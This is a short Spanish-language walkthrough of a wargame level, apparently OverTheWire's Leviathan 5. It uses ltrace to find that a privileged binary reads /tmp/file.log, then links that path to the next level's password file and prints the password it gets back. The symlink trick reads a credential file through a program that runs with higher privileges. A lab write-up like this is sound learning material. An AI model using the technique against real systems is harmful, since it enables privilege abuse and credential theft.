Notamos que hay un archivo ejecutable en la carpeta de usuario `leviathan5` 

```bash
$ ./leviathan5
Cannot find /tmp/file.log
```

Ejecutamos con `ltrace`.

```bash
$ ltrace ./leviathan5
__libc_start_main(0x8049206, 1, 0xffffd514, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                          = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

Parece que trata de abrir un archivo, por lo que lo crearemos

```bash
$ echo "Hola Mundo!" > /tmp/file.log
$ ./leviathan5
Hola Mundo!
```

El script lee el archivo /tmp/file.log, y lo imprime por pantalla. Crearemos un
link a la contraseña, para que el archivo ejecutable lo lea.

```bash
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
$ ./leviathan5
YZ55XPVk2l
```
